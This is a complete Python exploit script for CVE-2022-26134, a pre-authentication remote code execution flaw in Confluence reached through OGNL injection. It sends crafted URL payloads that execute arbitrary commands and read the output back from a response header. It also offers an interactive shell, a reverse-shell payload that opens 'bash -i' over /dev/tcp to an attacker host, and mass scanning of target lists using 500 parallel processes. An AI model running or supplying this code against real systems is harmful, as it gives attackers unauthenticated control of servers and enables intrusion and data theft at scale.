#!/usr/bin/python3

import os
import sys
import requests
import argparse
import urllib.parse
import multiprocessing
from rich.console import Console
from requests.packages import urllib3

urllib3.disable_warnings()
console = Console()
requestEngine = multiprocessing.Manager()
session = requests.Session()

global paramResults
paramResults = requestEngine.list()
globals().update(locals())


def exploit(url, interactive=None):
    globals().update(locals()) 

    if not "://" in url:
        url = "http://" + url

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate",
    }

    try:
        
        if args.lhost and args.lport:
            exploit = '${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("", Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command(\'bash\',\'-c\',\'bash -i >& /dev/tcp/' + args.lhost + '/' + str(args.lport) + ' 0>&1\').start()"))}'
            exploit = urllib.parse.quote(exploit)
            response = requests.get(url + '/' + exploit + '/' , headers=headers, verify=False, timeout=2, allow_redirects=False)
            console.print(f'[bold green] Trying revshell at {url}')
            sys.exit(0)

        else:
            exploit = urllib.parse.quote('/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("'+args.cmd+'").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/')
            response = requests.get(url + '/' + exploit, headers=headers, verify=False, timeout=2, allow_redirects=False)
            if response.status_code == 302 and len(response.headers['X-Cmd-Response']) > 1:
                try:
                    console.print(f"[bold green] Exploited : {url} --> [bold blue] {response.headers['X-Cmd-Response']}")
                    paramResults.append(f"Exploited : {url} \n-->  {response.headers['X-Cmd-Response']}\n")

                except:
                    interactive = None
                    if not args.file:
                        console.print("[bold red][!] Not vuln")
            
        if interactive and len(response.headers['X-Cmd-Response']) > 1:
            while True:
                try:
                    args.cmd = input("‚îå‚îÄ‚îÄ(chocapik„âøshell)-[‚≠ê]\n‚îî‚îÄüî• ")
                    if "exit" in args.cmd:
                        sys.exit(0)
                    if "clear" in args.cmd:
                        os.system('clear')

                    else:
                        exploit = urllib.parse.quote('/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("'+args.cmd+'").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/')
                        response = requests.get(url + exploit, headers=headers, verify=False, timeout=2, allow_redirects=False)
                        console.print(f"[purple] {response.headers['X-Cmd-Response']}")

                    
                except KeyboardInterrupt:
                    console.print("\r[bold yellow][!] Stoping exploit...")
                    sys.exit(0)

                except (KeyError,requests.exceptions.ReadTimeout):
                    pass
        
        

    except (requests.exceptions.Timeout,requests.exceptions.ConnectionError,requests.exceptions.InvalidURL,requests.exceptions.ChunkedEncodingError):
        pass

    except KeyboardInterrupt:
        console.print("[bold yellow][!] Stoping exploit...")
        exit(0)


def banner():
    console.print("[bold yellow][-] CVE-2022-26134")
    console.print("[bold yellow][-] Confluence Pre-Auth Remote Code Execution via OGNL Injection")
    console.print("[bold yellow][-] Creator : Valentin Lobstein \n")



def main():
    banner()
    globals().update(locals())
    try:
        f = open(f"{os.getcwd()}/{args.output}")
        urls = map(str.strip, f.readlines())
    except:
        pass

    try:
        if args.url and args.cmd:
            exploit(args.url, interactive=1)

        elif args.file and args.cmd:
            links = open(args.file, "r")
            multiReq = multiprocessing.Pool(500)
            multiReq.map(exploit, links)
            multiReq.close()
            multiReq.join()

        else:
            parser.print_help()
            sys.exit(1)
    except UnboundLocalError:
        pass

    except argparse.ArgumentError:
        parser.print_help()

    console.print(f"[bold yellow][!] Saving the output result in: {args.output}")
    console.print(f"[bold yellow][-] Exploited targets on this session : {len(paramResults)}")
    with open(args.output, "a") as f:
        for result in paramResults:
            f.write(f"\n{result}")
    f.close()    


parser = argparse.ArgumentParser()
parser.add_argument("-f", "--file", dest="file", help="example.txt")
parser.add_argument("-c", "--cmd", dest="cmd", help = "Shell command", default="whoami")
parser.add_argument("-p","--lport",dest="lport", help="Local port for reverse shell")
parser.add_argument("-l","--lhost",dest="lhost", help="Local host for reverse shell")
parser.add_argument("-u", "--url", dest="url", help="Base target uri (ex. http://target-uri/)")
parser.add_argument('-o', '--output', dest="output" , default='exploit_result.txt')

args = parser.parse_args()

if __name__ == "__main__":
    main()
